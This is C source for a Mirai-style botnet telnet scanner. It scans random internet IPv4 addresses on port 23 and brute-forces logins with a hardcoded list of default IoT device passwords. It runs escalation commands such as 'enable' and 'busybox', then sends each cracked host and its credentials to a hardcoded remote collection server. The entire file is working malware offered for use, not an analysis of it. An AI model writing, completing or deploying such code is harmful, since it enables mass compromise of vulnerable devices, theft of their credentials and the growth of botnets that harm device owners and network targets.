#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <errno.h>

#include "telnet.h"
#include "daemonhdr.h"
#include "includes.h"

static uint32_t x, y, z, w;

static void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}
static uint32_t rand_next(void)
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

static void util_zero(void *out) {
	int pos;
	for(pos = 0; pos < sizeof(out); pos++) {
		((unsigned char *)out)[pos] = 0;
	}
}

static int util_strlen(void *buf) {
	int x = 0;
	while(((char *)buf)[x] != 0) {
		x++;
	}
	return x;
}

static void util_memcpy(void *dst, void *src, int len)
{
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while(len--)
    {
        *r_dst++ = *r_src++;
    }
}

static int util_strcpy(void *dst, void *src)
{
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}

static void *util_strdup(void *src)
{
    char* newstr = (char*) malloc( util_strlen( src) + 1);

    if (newstr) {
        util_strcpy(newstr, src);
    }

    return newstr;
}

static int util_strcat(void *dest, void *src)
{
    int rc = util_strlen(dest)+util_strlen(src);
	char *r_dest = (char *)dest;
	char *r_src = (char *)src;
    while(*r_dest) r_dest++;
    while((*r_dest++ = *r_src++));

    return rc;
}

static unsigned int util_strexists(void *haystack, void *needle) {
	uint8_t haystack_len = util_strlen(haystack);
	uint8_t needle_len = util_strlen(needle);
	uint8_t needle_found = 0;
	uint8_t c_last = 0;
	uint8_t c_cur = 0;
	uint8_t pos = 0;
	
	for(pos = 0; pos < haystack_len; pos++) {
		c_cur = ((unsigned char *)haystack)[pos];
		if(c_cur == 0)
			break;
		if(c_cur == ((unsigned char *)needle)[needle_found] && (c_last == 0 || c_last == ((unsigned char *)needle)[needle_found-1])) {
			needle_found++;
			if(needle_found == needle_len) return 1;
		} else {
			needle_found = 0;
			c_last = 0;
			continue;
		}
		c_last = c_cur;
	}
	
	return 0;
}

static struct telnet_auth_entry_t **auths = {NULL};
static int auths_len = 0;

static void add_auth(char *username, char *password) {
    int username_len = util_strlen(username);
    int password_len = util_strlen(password);
    if(username_len > 64) {
        username_len = 64;
    }
    if(password_len > 64) {
        password_len = 64;
    }
    auths = realloc(auths, (auths_len+1)*sizeof(struct telnet_auth_entry_t *));
    auths[auths_len] = malloc(sizeof(struct telnet_auth_entry_t));
    util_memcpy(auths[auths_len]->username, username, username_len);
    util_memcpy(auths[auths_len]->password, password, password_len);
    auths_len++;
}

static void init_auth(void) {
    add_auth("root", "xc3511");
    add_auth("root", "vizxv");
    add_auth("mg3500", "merlin");
    add_auth("admin", "smcadmin");
    add_auth("default", "default");
    add_auth("admin", "admin");
    add_auth("root", "xmhdipc");
    add_auth("root", "root");
    add_auth("guest", "12345");
    add_auth("guest", "guest");
    add_auth("root", "hi3518");
    add_auth("root", "cat1029");
    add_auth("root", "GM8182");
    add_auth("root", "root621");
    add_auth("root", "Pon521");
    add_auth("root", "calvin");
    add_auth("root", "icatch99");
    add_auth("root", "vizxv");
    add_auth("guest", "12345");
    add_auth("ftp", "ftp");
    add_auth("telnetadmin", "telnetadmin");
}

static uint32_t generate_ipv4() {
    int o1 = -1, o2 = -1, o3 = -1, o4 = -1;

    do {
        if(o1 == -1) o1 = rand_next() % 224;
        if(o2 == -1) o2 = rand_next() % 255;
        if(o3 == -1) o3 = rand_next() % 255;
        if(o4 == -1) o4 = rand_next() % 255;

        if((o1 == 127) ||
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||
          (o1 == 198 && o2 >= 18 && o2 < 20) ||
          (o1 >= 224) || o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // 224.*.*.*+       - Multicast
        {
              o1 = -1;
              continue;
        }
        if((o1 == 192 && o2 == 168) || (o1 == 169 && o2 > 254)) // 169.254.0.0/16   - IANA NAT reserved
        {
            o2 = -1;
            continue;
        }
    } while(o1 == -1 || o2 == -1 || o3 == -1 || o4 == -1);

    return INET_ADDR(o1, o2, o3, o4);
} 

static char can_consume(char *buffer, int buffer_len, uint8_t *ptr, int amount)
{
    uint8_t *end = buffer + buffer_len;

    return ptr + amount < end;
}

#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3

static int connection_consume_iacs(int fd, char *buf, int buffer_len)
{
    unsigned char c;
    switch (buf[1]) {
    case CMD_IAC:
        return 0;
    case CMD_WILL:
    case CMD_WONT:
    case CMD_DO:
    case CMD_DONT:
        c = CMD_IAC;
        send(fd,&c, 1, MSG_NOSIGNAL);
        if (CMD_WONT == buf[1]) c = CMD_DONT;
        else if (CMD_DONT == buf[1]) c = CMD_WONT;
        else if (OPT_SGA == buf[1]) c = (buf[1] == CMD_DO ? CMD_WILL : CMD_DO);
        else c = (buf[1] == CMD_DO ? CMD_WONT : CMD_DONT);
        send(fd,&c, 1, MSG_NOSIGNAL);
        send(fd,&(buf[2]), 1, MSG_NOSIGNAL);
        break;
    default:
        break;
    }

    return 0;
}

static int read_with_timeout(int fd, char *buffer, int buf_size) {
    fd_set read_set;
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 3000;
    int rc;
    FD_ZERO(&read_set);
    FD_SET(fd,&read_set);
    if (select(fd + 1, &read_set, NULL, NULL,&tv) < 1)
        return 0;
    rc = recv(fd, buffer, buf_size, 0);
    if(rc > 0) {
        if (&buffer[0] == "\xFF") {
            connection_consume_iacs(fd, buffer, 3);
        }
    }

    return rc;
}

static int connection_consume_username(struct telnet_data_t *conn, char *buffer, int buffer_len) {
    if(util_strexists(buffer, ":") == -1) {
        return 1;
    }

    if(util_strexists(buffer, "ame") == 1 ||
       util_strexists(buffer, "ccount") == 1 ||
       util_strexists(buffer, "ogin") == 1 ||
       util_strexists(buffer, "nter") == 1) {
        return 1;
    }

    return 0;
}


static int connection_consume_password(struct telnet_data_t *conn, char *buffer, int buffer_len) {
    if(util_strexists(buffer, ":") == -1) {
        return 1;
    }

    if(util_strexists(buffer, "hrase") == 1 ||
       util_strexists(buffer, "ord") == 1 ||
       util_strexists(buffer, "ey") == 1) {
        return 1;
    }

    return 0;
}

static int connection_consume_busybox(struct telnet_data_t *conn, char *buffer, int buffer_len) {
    if(util_strexists(buffer, "BusyBox") == 1 ||
       util_strexists(buffer, "Built-in") == 1) {
        return 1;
    }

    return 0;
}

static int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i, matched = 0;

    if (mem_len > buf_len)
        return -1;

    for (i = 0; i < buf_len; i++)
    {
        if (buf[i] == mem[matched])
        {
            if (++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}

static void reset_connection(struct telnet_data_t *conn) {
    if(conn->fd != -1) {
        close(conn->fd);
    }
    conn->fd = -1;
    conn->dir.path_pos = 0;
    util_zero(conn->dir.path);
    conn->dir.state = 0;
    conn->connected = 0;
    conn->cred_pos = rand_next() % auths_len;
    conn->cred_retry = 0;
    conn->timeout = 0;
    conn->wait = 0;
    conn->upload_method = TELNET_UPLOAD_METHOD_NONE;
    conn->state = TELNET_STATE_NOT_CONNECTED;
}

static void close_connection(struct telnet_data_t *conn) {
    if(conn->fd != -1) {
        close(conn->fd);
    }
    conn->fd = -1;
    if(conn->state > TELNET_STATE_SEND_USERNAME) {
        if(conn->cred_retry >= 3) {
            conn->timeout = 0;
            conn->state = TELNET_STATE_NOT_CONNECTED;
            conn->wait = time(NULL);
            conn->cred_pos = rand_next() % auths_len;
            conn->cred_retry++;
            return;
        }
    }
    reset_connection(conn);
}

static char *paths[] = {
    "/tmp/",
    "/opt/",
    "/var/tmp/",
    "/mnt/"
};

static void report_working(uint32_t host, uint16_t port, char *username, uint16_t username_len, char *password, uint16_t password_len)
{
	int buffer_len = sizeof(uint32_t)+sizeof(uint16_t)+username_len+password_len+1;
	char *buffer = malloc(buffer_len);
	util_memcpy(buffer, &host, sizeof(uint32_t));
	util_memcpy(buffer+sizeof(uint32_t), &port, sizeof(uint16_t));
    util_memcpy(buffer+sizeof(uint32_t)+sizeof(uint16_t), &username_len, sizeof(uint16_t));
	util_memcpy(buffer+sizeof(uint32_t)+sizeof(uint16_t)+sizeof(uint16_t), username, username_len);
	util_memcpy(buffer+sizeof(uint32_t)+sizeof(uint16_t)+sizeof(uint16_t)+username_len, &password_len, sizeof(uint16_t));
    util_memcpy(buffer+sizeof(uint32_t)+sizeof(uint16_t)+sizeof(uint16_t)+username_len+sizeof(uint16_t), password, password_len);
	util_memcpy(buffer+sizeof(uint32_t)+sizeof(uint16_t)+sizeof(uint16_t)+username_len+sizeof(uint16_t)+password_len, "\0", 1);
	
	
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	
	if(!sockfd)
	{
		stop_daemon(ID_TYPE_SCANNER, DAEMON_TYPE_FORK_RESTART);
		exit(0);// this shouldnt be needed XD
	}
	
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(2020);
	addr.sin_addr.s_addr = inet_addr("107.182.129.217");
	if(connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
	{
		stop_daemon(ID_TYPE_SCANNER, DAEMON_TYPE_FORK_RESTART);
		exit(0);// this shouldnt be needed XD
	}
	
	
	if(send(sockfd, buffer, buffer_len, MSG_NOSIGNAL) < 0)
	{
		stop_daemon(ID_TYPE_SCANNER, DAEMON_TYPE_FORK_RESTART);
		exit(0);// this shouldnt be needed XD
	}
	
	close(sockfd);
}

//l33ts telnet scanner with no infector just brute
void telnet_scanner_init(void *idk) {
    int i;
    struct telnet_data_t **sessions = calloc(558, sizeof(struct telnet_data_t *));

    char buffer[8192];
    int buffer_len = 0;
    
    for(i = 0; i < 558; i++)
    {
        sessions[i] = malloc(sizeof(struct telnet_data_t));
        sessions[i]->fd = -1;
        sessions[i]->dir.path_pos = 0;
        util_zero(sessions[i]->dir.path);
        sessions[i]->dir.state = 0;
        sessions[i]->connected = 0;
        sessions[i]->cred_pos = rand_next() % auths_len;
        sessions[i]->cred_retry = 0;
        sessions[i]->timeout = 0; 
        sessions[i]->wait = 0;
        sessions[i]->upload_method = TELNET_UPLOAD_METHOD_NONE;
        sessions[i]->state = TELNET_STATE_NOT_CONNECTED;
    }

    while(1) {
        int id;
        for(id = 0; id < 558; id++)
        {
            switch(sessions[id]->state)
            {
                case TELNET_STATE_NOT_CONNECTED:
                    if(1) {
                        struct sockaddr_in addr;
                        if(sessions[id]->connected == 0) {
                            sessions[id]->addr = generate_ipv4();
                        } else {
                            if(sessions[id]->wait+8 > time(NULL)) continue;
                        }
                        addr.sin_addr.s_addr = sessions[id]->addr;
                        addr.sin_port = htons(23);
                        addr.sin_family = AF_INET;
                        sessions[id]->fd = socket(AF_INET, SOCK_STREAM, 0);

                        if (sessions[id]->fd == -1) break;

                        fcntl(sessions[id]->fd, F_SETFL, fcntl(sessions[id]->fd, F_GETFL, NULL) | O_NONBLOCK);
                        sessions[id]->timeout = time(NULL);
                        if(connect(sessions[id]->fd, (struct sockaddr *)&addr, sizeof(addr)) == -1 && errno != EINPROGRESS)
                        {
                            #ifdef DEBUG
                            //printf("[FD%d] Failed to connect to device (%d.%d.%d.%d)\r\n", id, sessions[id]->addr & 0xff, (sessions[id]->addr >> 8) & 0xff, (sessions[id]->addr >> 16) & 0xff, (sessions[id]->addr >> 24) & 0xff);
                            #endif
                            sessions[id]->state = TELNET_STATE_NOT_CONNECTED;
                            break;
                        } 
                        else 
                        {
                            #ifdef DEBUG
                            //printf("[FD%d] FOUND HOST \r\n", id);
                            #endif
                            sessions[id]->state = TELNET_STATE_CONNECTING;
                            break;
                        }
                    }
                case TELNET_STATE_CONNECTING:
                    if(1) {
                        int res;
                        int lon;
                        int valopt;
                        fd_set fdset;
                        FD_ZERO(&fdset);
                        FD_SET(sessions[id]->fd, &fdset);
                        struct timeval tv;
                        tv.tv_sec = 0;
                        tv.tv_usec = 600;
                        res = select(sessions[id]->fd + 1, NULL,&fdset, NULL,&tv);

                        if (res == 1) {
                            lon = sizeof(int);
                            valopt = 0;
                            getsockopt(sessions[id]->fd, SOL_SOCKET, SO_ERROR, (void * )(&valopt),&lon);
                            if (valopt) {
                                close_connection(sessions[id]);
                            } else {
                                fcntl(sessions[id]->fd, F_SETFL, fcntl(sessions[id]->fd, F_GETFL, NULL)&(~O_NONBLOCK));
                                //sessions[id]->state = TELNET_STATE_SEND_IACS;
                                sessions[id]->state = TELNET_STATE_SEND_USERNAME;
                                sessions[id]->timeout = time(NULL);
                                sessions[id]->connected = 1;
                                #ifdef DEBUG
                                printf("[FD%d] Connected to host \r\n", id);
                                #endif
                            }
                            break;
                        } else if (res == -1) {
                            close_connection(sessions[id]);
                            break;
                        }

                        if (sessions[id]->timeout + 7 < time(NULL)) {
                            close_connection(sessions[id]);
                        }
                        break;
                    }
                case TELNET_STATE_SEND_IACS:
                    if (read_with_timeout(sessions[id]->fd, buffer, sizeof(buffer)) <= 0)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK && errno != EINPROGRESS)
                        {
                        #ifdef DEBUG
                            printf("[FD%d] Encountered error %d. Closing\r\n", id, errno);
                        #endif
                            close_connection(sessions[id]);
                        }
                        if (sessions[id]->timeout + 6 < time(NULL)) {
                            #ifdef DEBUG
                                printf("[FD%d] No IAC protocol found (recv timeout), closing connection!\r\n", id);
                            #endif
                            close_connection(sessions[id]);
                        }
                        memset(buffer, 0, sizeof(buffer));
                        buffer_len = 0;
                        break;
                    }
                    if(connection_consume_iacs(sessions[id]->fd, buffer, util_strlen(buffer)) == 0)
                    {
                        memset(buffer, 0, sizeof(buffer));
                        buffer_len = 0;
                        if (sessions[id]->timeout + 8 < time(NULL)) {
                            #ifdef DEBUG
                                printf("[FD%d] No IAC protocol found, closing connection!\r\n", id);
                            #endif
                            close_connection(sessions[id]);
                        }
                        break;
                    } else {
                        #ifdef DEBUG
                            printf("[FD%d] Found working IAC telnet\r\n", id);
                        #endif
                        sessions[id]->state = TELNET_STATE_SEND_USERNAME;
                        sessions[id]->timeout = time(NULL);
                        memset(buffer, 0, sizeof(buffer));
                        buffer_len = 0;
                        break;
                    }
                case TELNET_STATE_SEND_USERNAME:
                    if (read_with_timeout(sessions[id]->fd, buffer, sizeof(buffer)) <= 0)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK && errno != EINPROGRESS)
                        {
                        #ifdef DEBUG
                            printf("[FD%d] Encountered error %d. Closing\r\n", id, errno);
                        #endif
                            close_connection(sessions[id]);
                        }
                        if (sessions[id]->timeout + 10 < time(NULL)) {
                            #ifdef DEBUG
                                printf("[FD%d] Username prompt (recv timeout), closing connection!\r\n", id);
                            #endif
                            close_connection(sessions[id]);
                        }
                        memset(buffer, 0, sizeof(buffer));
                        buffer_len = 0;
                        break;
                    }
                    if(connection_consume_username(sessions[id], buffer, util_strlen(buffer)) == 0)
                    {
                        if (sessions[id]->timeout + 10 < time(NULL)) {
                            #ifdef DEBUG
                                printf("[FD%d] No username prompt found, closing connection!\r\n", id);
                            #endif
                        }
                        close_connection(sessions[id]);
                        memset(buffer, 0, sizeof(buffer));
                        buffer_len = 0;
                        break;
                    } else {
                        #ifdef DEBUG
                            printf("[FD%d] Found username prompt, sending username\r\n", id);
                        #endif
                        char sendbuf[512];
                        util_strcpy(sendbuf, auths[sessions[id]->cred_pos]->username);
                        util_strcpy(sendbuf+util_strlen(sendbuf), "\n\0");
                        if(send(sessions[id]->fd, sendbuf, util_strlen(sendbuf)+1, MSG_NOSIGNAL) < 0) {
                            #ifdef DEBUG
                            printf("[FD%d] Send failed!\r\n", id);
                            #endif
                            close_connection(sessions[id]);
                            memset(buffer, 0, sizeof(buffer));
                            buffer_len = 0;
                            break;
                        }
                        sessions[id]->state = TELNET_STATE_SEND_PASSWORD;
                        sessions[id]->timeout = time(NULL);
                        memset(buffer, 0, sizeof(buffer));
                        buffer_len = 0;
                        break;
                    }
                    break;
                case TELNET_STATE_SEND_PASSWORD:
                    if (read_with_timeout(sessions[id]->fd, buffer, sizeof(buffer)) <= 0)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK && errno != EINPROGRESS)
                        {
                        #ifdef DEBUG
                            printf("[FD%d] Encountered error %d. Closing\r\n", id, errno);
                        #endif
                            close_connection(sessions[id]);
                        }
                        if (sessions[id]->timeout + 10 < time(NULL)) {
                            #ifdef DEBUG
                                printf("[FD%d] Password prompt (recv timeout), closing connection!\r\n", id);
                            #endif
                            close_connection(sessions[id]);
                        }
                        memset(buffer, 0, sizeof(buffer));
                        buffer_len = 0;
                        break;
                    }
                    if(connection_consume_password(sessions[id], buffer, util_strlen(buffer)) == 0)
                    {
                        if (sessions[id]->timeout + 10 < time(NULL)) {
                            #ifdef DEBUG
                                printf("[FD%d] password prompt not found, closing connection!\r\n", id);
                            #endif
                            close_connection(sessions[id]);
                        }
                        memset(buffer, 0, sizeof(buffer));
                        buffer_len = 0;
                        break;
                    } else {
                        #ifdef DEBUG
                            printf("[FD%d] Found password prompt, sending password\r\n", id);
                        #endif
                        char sendbuf[512];
                        util_strcpy(sendbuf, auths[sessions[id]->cred_pos]->password);
                        util_strcpy(sendbuf+util_strlen(sendbuf), "\n\0");
                        if(send(sessions[id]->fd, sendbuf, util_strlen(sendbuf)+1, MSG_NOSIGNAL) < 0) {
                            #ifdef DEBUG
                            printf("[FD%d] Send failed!\r\n", id);
                            #endif
                            close_connection(sessions[id]);
                            memset(buffer, 0, sizeof(buffer));
                            buffer_len = 0;
                            break;
                        }
                        sessions[id]->state = TELNET_STATE_SEND_SHELL;
                        sessions[id]->timeout = time(NULL);
                        memset(buffer, 0, sizeof(buffer));
                        buffer_len = 0;
                        break;
                    }
                    break;
                case TELNET_STATE_SEND_SHELL:
                    if(1) {
                        char sendbuf[512];
                        util_strcpy(sendbuf, "shell");
                        util_strcpy(sendbuf+util_strlen(sendbuf), "\n\0");
                        if(send(sessions[id]->fd, sendbuf, util_strlen(sendbuf)+1, MSG_NOSIGNAL) < 0) {
                            #ifdef DEBUG
                            printf("[FD%d] Send failed!\r\n", id);
                            #endif
                            close_connection(sessions[id]);
                            memset(buffer, 0, sizeof(buffer));
                            buffer_len = 0;
                            break;
                        }
                        util_zero(sendbuf);
                        util_strcpy(sendbuf, "system");
                        util_strcpy(sendbuf+util_strlen(sendbuf), "\n\0");
                        if(send(sessions[id]->fd, sendbuf, util_strlen(sendbuf)+1, MSG_NOSIGNAL) < 0) {
                            #ifdef DEBUG
                            printf("[FD%d] Send failed!\r\n", id);
                            #endif
                            close_connection(sessions[id]);
                            memset(buffer, 0, sizeof(buffer));
                            buffer_len = 0;
                            break;
                        }
                        util_zero(sendbuf);
                        util_strcpy(sendbuf, "enable");
                        util_strcpy(sendbuf+util_strlen(sendbuf), "\n\0");
                        if(send(sessions[id]->fd, sendbuf, util_strlen(sendbuf)+1, MSG_NOSIGNAL) < 0) {
                            #ifdef DEBUG
                            printf("[FD%d] Send failed!\r\n", id);
                            #endif
                            close_connection(sessions[id]);
                            memset(buffer, 0, sizeof(buffer));
                            buffer_len = 0;
                            break;
                        }
                        util_zero(sendbuf);
                        util_strcpy(sendbuf, "busybox");
                        util_strcpy(sendbuf+util_strlen(sendbuf), "\n\0");
                        if(send(sessions[id]->fd, sendbuf, util_strlen(sendbuf)+1, MSG_NOSIGNAL) < 0) {
                            #ifdef DEBUG
                            printf("[FD%d] Send failed!\r\n", id);
                            #endif
                            close_connection(sessions[id]);
                            memset(buffer, 0, sizeof(buffer));
                            buffer_len = 0;
                            break;
                        }
                        util_zero(sendbuf);
                        memset(buffer, 0, sizeof(buffer));
                        buffer_len = 0;
                        sessions[id]->state = TELNET_STATE_CHECK_BUSYBOX;
                        sessions[id]->timeout = time(NULL);
                    }
                    break;
                case TELNET_STATE_CHECK_BUSYBOX:
                    if (read_with_timeout(sessions[id]->fd, buffer, sizeof(buffer)) <= 0)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK && errno != EINPROGRESS)
                        {
                        #ifdef DEBUG
                            printf("[FD%d] Encountered error %d. Closing\r\n", id, errno);
                        #endif
                            close_connection(sessions[id]);
                        }
                        if (sessions[id]->timeout + 10 < time(NULL)) {
                            #ifdef DEBUG
                                printf("[FD%d] BusyBox prompt (recv timeout), closing connection!\r\n", id);
                            #endif
                            close_connection(sessions[id]);
                        }
                        memset(buffer, 0, sizeof(buffer));
                        buffer_len = 0;
                        break;
                    }
                    if(connection_consume_busybox(sessions[id], buffer, util_strlen(buffer)) == 0)
                    {
                        if (sessions[id]->timeout + 10 < time(NULL)) {
                            #ifdef DEBUG
                                printf("[FD%d] (%d.%d.%d.%d:23 %s:%s) busybox response not found, closing connection!\r\n", id, sessions[id]->addr & 0xff, (sessions[id]->addr >> 8) & 0xff, (sessions[id]->addr >> 16) & 0xff, (sessions[id]->addr >> 24) & 0xff, auths[sessions[id]->cred_pos]->username, auths[sessions[id]->cred_pos]->password);
                            #endif
                            close_connection(sessions[id]);
                        }
                        memset(buffer, 0, sizeof(buffer));
                        buffer_len = 0;
                        break;
                    } else {
                        #ifdef DEBUG
                        printf("[FD%d] (%d.%d.%d.%d:23 %s:%s) Found working telnet\r\n", id, sessions[id]->addr & 0xff, (sessions[id]->addr >> 8) & 0xff, (sessions[id]->addr >> 16) & 0xff, (sessions[id]->addr >> 24) & 0xff, auths[sessions[id]->cred_pos]->username, auths[sessions[id]->cred_pos]->password);
                        #endif
						report_working(sessions[id]->addr, 23, auths[sessions[id]->cred_pos]->username, util_strlen(auths[sessions[id]->cred_pos]->username), auths[sessions[id]->cred_pos]->password, util_strlen(auths[sessions[id]->cred_pos]->password));
                        close_connection(sessions[id]);
                        memset(buffer, 0, sizeof(buffer));
                        buffer_len = 0;
                        break;
                    }
                    break;
            }
        }
    }
}
